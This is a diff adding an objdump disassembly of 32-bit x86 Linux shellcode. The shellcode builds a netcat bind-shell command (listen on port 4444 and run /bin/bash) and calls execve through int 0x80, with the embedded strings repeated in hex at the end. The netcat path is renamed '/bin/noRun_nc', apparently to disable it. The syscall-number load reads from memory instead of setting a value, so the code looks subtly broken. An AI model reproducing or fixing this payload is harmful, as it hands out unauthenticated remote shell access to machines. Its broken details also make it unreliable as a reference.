@@ -1,0 +1,52 @@
+080483e2 <shellcode>:
+ 80483e2:       e8 26 00 00 00          call   804840d <shellcode+0x2b>
+ 80483e7:       2f                      das
+ 80483e8:       62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
+ 80483eb:       2f                      das
+ 80483ec:       62 61 73                bound  esp,QWORD PTR [ecx+0x73]
+ 80483ef:       68 00 2d 65 00          push   0x652d00
+ 80483f4:       34 34                   xor    al,0x34
+ 80483f6:       34 34                   xor    al,0x34
+ 80483f8:       00 2d 70 00 2d 6c       add    BYTE PTR ds:0x6c2d0070,ch
+ 80483fe:       00 2f                   add    BYTE PTR [edi],ch
+ 8048400:       62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
+ 8048403:       2f                      das
+ 8048404:       6e                      outs   dx,BYTE PTR ds:[esi]
+ 8048405:       6f                      outs   dx,DWORD PTR ds:[esi]
+ 8048406:       52                      push   edx
+ 8048407:       75 6e                   jne    8048477 <__libc_csu_init+0x37>
+ 8048409:       5f                      pop    edi
+ 804840a:       6e                      outs   dx,BYTE PTR ds:[esi]
+ 804840b:       63 00                   arpl   WORD PTR [eax],ax
+ 804840d:       5e                      pop    esi                              esi 80483e7
+ 804840e:       6a 00                   push   0x0
+ 8048410:       56                      push   esi
+ 8048411:       83 c6 0a                add    esi,0xa
+ 8048414:       56                      push   esi
+ 8048415:       83 c6 03                add    esi,0x3
+ 8048418:       56                      push   esi
+ 8048419:       83 c6 05                add    esi,0x5
+ 804841c:       56                      push   esi
+ 804841d:       83 c6 03                add    esi,0x3
+ 8048420:       56                      push   esi
+ 8048421:       83 c6 03                add    esi,0x3
+ 8048424:       56                      push   esi
+ 8048425:       a1 0b 00 00 00          mov    eax,ds:0xb
+ 804842a:       89 f3                   mov    ebx,esi
+ 804842c:       89 e1                   mov    ecx,esp
+ 804842e:       ba 00 00 00 00          mov    edx,0x0
+ 8048433:       cd 80                   int    0x80
+ 8048435:       66 90                   xchg   ax,ax
+ 8048437:       66 90                   xchg   ax,ax
+ 8048439:       66 90                   xchg   ax,ax
+ 804843b:       66 90                   xchg   ax,ax
+ 804843d:       66 90                   xchg   ax,ax
+ 804843f:       90                      nop
+
+
+esi: 80483e7
+
+
+2f 6e 6f 52 75 6e 5f 6e 63
+
+2f62696e2f62617368002d650034343434002d70002d6c002f62696e2f6e6f52756e5f6e6300
